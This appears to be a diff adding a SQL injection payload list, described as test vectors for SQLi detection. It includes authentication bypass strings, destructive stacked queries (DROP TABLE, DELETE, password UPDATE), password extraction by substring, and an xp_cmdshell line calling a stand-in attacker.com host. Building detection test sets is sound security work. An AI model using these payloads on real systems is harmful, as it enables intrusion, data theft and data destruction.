@@ -1,0 +1,128 @@
+# SQL Injection Payload File
+# Educational payloads for SQL Injection detection
+# Each line represents a different SQLi test vector
+# Lines starting with # are comments and will be ignored
+
+# Basic syntax errors (error-based detection)
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+
+# Boolean-based blind SQLi
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR 1=1--
+" OR "1"="1
+" OR "1"="1" --
+" OR 1=1--
+
+# Authentication bypass
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+" or 1=1--
+or 1=1--
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+
+# Union-based SQLi
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+" UNION SELECT NULL--
+
+# Time-based blind SQLi (response delay)
+' OR SLEEP(5)--
+' AND SLEEP(5)--
+' OR IF(1=1,SLEEP(5),0)--
+'; WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '00:00:05'--
+' OR pg_sleep(5)--
+' AND pg_sleep(5)--
+
+# Stacked queries
+'; DROP TABLE users--
+'; DELETE FROM users--
+'; UPDATE users SET password='hacked'--
+
+# Comment injection
+'--
+"--
+'#
+"#
+'/*
+"/*
+
+# Database-specific error triggers (MySQL)
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' UNION SELECT @@version--
+
+# PostgreSQL-specific
+' AND 1=CAST((SELECT version()) AS int)--
+' UNION SELECT version()--
+' OR pg_sleep(5)--
+
+# MSSQL-specific
+' AND 1=CONVERT(int, (SELECT @@version))--
+' WAITFOR DELAY '0:0:5'--
+' UNION SELECT @@version--
+
+# Oracle-specific
+' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS int)--
+' UNION SELECT banner FROM v$version WHERE rownum=1--
+
+# SQLite-specific
+' AND 1=CAST((SELECT sqlite_version()) AS int)--
+' UNION SELECT sqlite_version()--
+
+# Encoded SQLi attempts
+%27%20OR%20%271%27=%271
+%22%20OR%20%221%22=%221
+' OR 1=1%00
+" OR 1=1%00
+
+# Concatenation-based
+' + '
+' || '
+'+'
+admin' + '0
+admin' || '0
+
+# Advanced boolean-based
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97
+
+# Out-of-band SQLi (blind extraction)
+'; EXEC xp_cmdshell('nslookup attacker.com')--
+
+# Login form specific
+admin'--
+admin' or '1'='1
+admin' or 1=1--
+administrator'--
+' or 1=1 limit 1--
+
+# Second-order SQLi markers
+' (SELECT 'sqlinjection
+' (SELECT 'test
+
+# JSON SQLi
+{"username": "admin' OR '1'='1'--", "password": "anything"}
+{"username": "admin'--", "password": ""}
+
+# XML SQLi
+<username>admin' OR '1'='1'--</username>
+<username>admin'--</username>
